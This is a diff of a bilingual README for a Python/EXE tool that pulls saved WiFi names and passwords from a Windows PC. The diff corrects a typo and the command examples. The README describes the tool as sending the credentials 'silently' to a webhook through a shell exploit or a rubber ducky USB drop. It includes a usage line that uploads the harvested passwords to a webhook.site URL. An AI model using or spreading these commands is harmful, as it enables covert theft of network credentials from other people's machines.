@@ -14,7 +14,7 @@ Script to extract WIFI passwords from a pc uploading it remotely (shell exploit)
 and also can be used offline, physically (rubber ducky)
 
 Script para extraer contraseñas WIFI de un pc subiendolo remotamente(shell exploit) y enviarlo a una url "silenciosamente"(webhook) 
-Tambien se puede usar offline, físicamente con un pendrive(rubby ducky)
+Tambien se puede usar offline, físicamente con un pendrive(rubber ducky)
 
 Usage: E_WIFI.py [OPTIONS]
 
@@ -35,7 +35,7 @@ Offline
 
 python3 E_WIFIoffline.py
 
-CMD or Powershell ./E_WIFIoffline.exe (You can also double click it)
+CMD or Powershell E_WIFIoffline.exe | ./E_WIFIoffline.exe (You can also double click it)
 
 Creates a txt with the WIFI's ssid and passwords stored in the local machine
 Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local
@@ -47,7 +47,7 @@ Usages
 default usage
 python3 E_WIFI.py
 
-CMD or Powershell ./E_WIFI.exe
+CMD or Powershell E_WIFI.exe | ./E_WIFI.exe
 
 Creates a txt with the WIFI's ssid and passwords stored in the local machine
 Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local
@@ -55,7 +55,7 @@ Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local
 Another Example
 
 python3 E_WIFI.py -o -u https://webhook.site/yoururl 
-CMD or Powershell ./E_WIFI.exe -o -u https://webhook.site/yoururl
+CMD or Powershell E_WIFI.exe | ./E_WIFI.exe -o -u https://webhook.site/yoururl
 
 type --help for more detailed info
 
